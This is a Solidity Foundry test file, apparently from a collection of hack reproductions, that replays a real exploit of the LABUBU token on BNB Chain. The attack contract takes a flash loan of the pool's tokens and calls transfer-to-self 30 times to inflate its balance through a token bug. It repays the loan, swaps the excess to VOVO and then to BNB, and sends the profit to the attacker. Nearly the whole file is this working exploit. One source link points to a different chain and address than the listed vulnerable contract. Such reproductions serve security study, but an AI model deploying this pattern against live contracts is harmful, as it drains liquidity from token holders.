// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 17.4 BNB (~ $12,048)
// Attacker : https://bscscan.com/address/0x27441c62dbe261fdf5e1feec7ed19cf6820d583b
// Attack Contract : https://bscscan.com/address/0x2ff0cc42e513535bd56be20c3e686a58608260ca
// Vulnerable Contract : https://bscscan.com/address/0x2ff960f1d9af1a6368c2866f79080c1e0b253997#code
// Attack Tx : https://bscscan.com/tx/0xb06df371029456f2bf2d2edb732d1f3c8292d4271d362390961fdcc63a2382de

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a#code
//                            L127 ~ L138

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/1866481066610958431

address constant PancakeV3Pool = 0xe70294c3D81ea914A883ad84fD80473C048C028C;
address constant PancakeV3Router = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
address constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

address constant LABUBU = 0x2fF960F1D9AF1A6368c2866f79080C1E0B253997;
address constant VOVO = 0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6;
address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

contract LABUBU_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 44751945 - 1);

        vm.label(PancakeV3Pool, "PancakeV3Pool");
        vm.label(PancakeV3Router, "PancakeSwap: Smart Router V3");
        vm.label(PancakeV2Router, "PancakeSwap: Router v2");

        vm.label(LABUBU, "LABUBU");
        vm.label(VOVO, "VOVO Token");
        vm.label(wBNB, "wBNB");
    }

    function testPoC() public {
        vm.startPrank(attacker);

        AttackerC attC = new AttackerC();
        attC.attack();

        emit log_named_decimal_uint("Profit in BNB", attacker.balance, 18);

        vm.stopPrank();
    }
}

contract AttackerC {

    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() public {
        // console.log(IPancakeV3Pool(PancakeV3Pool).token0()); // LABUBU
        // console.log(IPancakeV3Pool(PancakeV3Pool).token1()); // VOVO Token

        uint256 amount0 = IERC20(LABUBU).balanceOf(PancakeV3Pool);
        // console.log(amount0); // 415636276381601458
        // console.logBytes(abi.encode(PancakeV3Pool, amount0)); // 0x000000000000000000000000e70294c3d81ea914a883ad84fd80473c048c028c00000000000000000000000000000000000000000000000005c4a2fdc17dceb2

        IPancakeV3Pool(PancakeV3Pool).flash(
            address(this),
            amount0,
            0,
            abi.encode(PancakeV3Pool, amount0)
        );

        // Balance of LABUBU
        uint256 balance = IERC20(LABUBU).balanceOf(address(this));
        // console.log(balance); // 12468049200757089736

        uint24 fee = IPancakeV3Pool(PancakeV3Pool).fee();
        // console.log(fee); // 2500

        IERC20(LABUBU).approve(PancakeV3Router, balance);
        IPancakeSwapRouterV3.ExactInputSingleParams memory params = IPancakeSwapRouterV3.ExactInputSingleParams({
            tokenIn: LABUBU,
            tokenOut: VOVO,
            fee: fee,
            recipient: address(this),
            amountIn: balance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uint256 amountOut = IPancakeSwapRouterV3(PancakeV3Router).exactInputSingle(params);

        // console.log(amountOut);
        // console.log(IERC20(VOVO).balanceOf(address(this)));

        IERC20(VOVO).approve(PancakeV2Router, amountOut);
        address[] memory path = new address[](2);
        path[0] = VOVO;
        path[1] = wBNB;
        Uni_Router_V2(PancakeV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountOut, 0, path, address(this), block.timestamp + 60
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {

        (address pool, uint256 amount0) = abi.decode(data, (address, uint256));

        for (uint i = 0; i < 30; i++) {
            IERC20(LABUBU).transfer(address(this), amount0);
        }

        // Return the borrowed amount + fee
        IERC20(LABUBU).transfer(pool, amount0+fee0);
    }

    fallback() external payable {
        // console.log("Received BNB:", msg.value);
        payable(owner).transfer(msg.value);
    }
}

interface IPancakeSwapRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}